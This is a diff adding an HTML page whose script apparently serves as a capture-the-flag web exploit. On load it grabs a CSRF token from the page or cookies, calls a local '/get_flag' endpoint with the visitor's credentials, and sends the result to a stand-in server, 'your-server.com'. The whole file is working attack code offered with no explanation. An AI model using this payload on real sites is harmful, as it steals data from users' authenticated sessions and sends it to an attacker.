@@ -1,0 +1,22 @@
+<html>
+  <body>
+    <script>
+      (async () => {
+        const csrf = document.querySelector('meta[name="csrf-token"]')?.content 
+                    || document.cookie.match(/csrf_token=([^;]+)/)?.[1];
+        if (!csrf) return;
+
+        const res = await fetch('http://localhost:3000/get_flag', {
+          credentials: 'include',
+          headers: { 'X-CSRF-Token': csrf }
+        });
+
+        const data = await res.json();
+        if (data.flag) {
+          // Exfiltrate the flag to your server
+          fetch('http://your-server.com/log?flag=' + encodeURIComponent(data.flag));
+        }
+      })();
+    </script>
+  </body>
+</html>
